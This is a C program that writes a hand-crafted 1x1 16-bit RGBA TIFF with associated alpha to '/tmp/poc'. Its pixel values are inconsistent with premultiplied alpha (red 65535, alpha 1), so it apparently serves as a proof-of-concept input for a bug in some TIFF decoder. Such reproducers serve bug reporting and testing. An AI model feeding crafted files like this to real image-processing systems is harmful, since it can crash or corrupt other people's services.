#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    int width = 1;
    int height = 1;
    int samples_per_pixel = 4;
    int bits_per_sample = 16;
    int row_size = width * samples_per_pixel * (bits_per_sample / 8);
    int strip_size = row_size * height;

    /* TIFF header: little-endian, magic 42, IFD offset = 8 */
    fputc(0x49, f); fputc(0x49, f); fputc(0x2A, f); fputc(0x00, f);
    fputc(0x08, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* IFD at offset 8: number of directory entries = 10 */
    fputc(0x0A, f); fputc(0x00, f);

    /* Entry 1: Tag 256 (ImageWidth), type LONG (4), count 1, value = 1 */
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x04, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 2: Tag 257 (ImageLength), type LONG (4), count 1, value = 1 */
    fputc(0x01, f); fputc(0x01, f);
    fputc(0x04, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 3: Tag 258 (BitsPerSample), type SHORT (3), count 4, value at offset after IFD */
    fputc(0x02, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x04, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    long bps_offset_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 4: Tag 259 (Compression), type SHORT (3), count 1, value 1 */
    fputc(0x03, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 5: Tag 262 (PhotometricInterpretation), type SHORT (3), count 1, value 2 */
    fputc(0x06, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x02, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 6: Tag 273 (StripOffsets), type LONG (4), count 1, placeholder */
    fputc(0x11, f); fputc(0x01, f);
    fputc(0x04, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    long strip_offsets_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 7: Tag 277 (SamplesPerPixel), type SHORT (3), count 1, value 4 */
    fputc(0x15, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x04, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 8: Tag 278 (RowsPerStrip), type LONG (4), count 1, value = 1 */
    fputc(0x16, f); fputc(0x01, f);
    fputc(0x04, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 9: Tag 279 (StripByteCounts), type LONG (4), count 1, value = strip_size */
    fputc(0x17, f); fputc(0x01, f);
    fputc(0x04, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(strip_size & 0xFF, f); fputc((strip_size >> 8) & 0xFF, f);
    fputc((strip_size >> 16) & 0xFF, f); fputc((strip_size >> 24) & 0xFF, f);

    /* Entry 10: Tag 338 (ExtraSamples), type SHORT (3), count 1, value 2 (associated alpha) */
    fputc(0x52, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x02, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Next IFD offset: 0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* BitsPerSample values: 16,16,16,16 */
    long bps_offset = ftell(f);
    fputc(0x10, f); fputc(0x00, f);
    fputc(0x10, f); fputc(0x00, f);
    fputc(0x10, f); fputc(0x00, f);
    fputc(0x10, f); fputc(0x00, f);

    /* Pixel data: 1x1 RGBA 16-bit with alpha=1 */
    long pixel_data_offset = ftell(f);
    fputc(0xFF, f); fputc(0xFF, f); /* R = 65535 */
    fputc(0x00, f); fputc(0x00, f); /* G = 0 */
    fputc(0x00, f); fputc(0x00, f); /* B = 0 */
    fputc(0x01, f); fputc(0x00, f); /* A = 1 */

    /* Update BitsPerSample offset */
    fseek(f, bps_offset_pos, SEEK_SET);
    unsigned int bps_val = (unsigned int)bps_offset;
    fputc(bps_val & 0xFF, f);
    fputc((bps_val >> 8) & 0xFF, f);
    fputc((bps_val >> 16) & 0xFF, f);
    fputc((bps_val >> 24) & 0xFF, f);

    /* Update StripOffsets value */
    fseek(f, strip_offsets_pos, SEEK_SET);
    unsigned int offset_val = (unsigned int)pixel_data_offset;
    fputc(offset_val & 0xFF, f);
    fputc((offset_val >> 8) & 0xFF, f);
    fputc((offset_val >> 16) & 0xFF, f);
    fputc((offset_val >> 24) & 0xFF, f);

    fclose(f);
    return 0;
}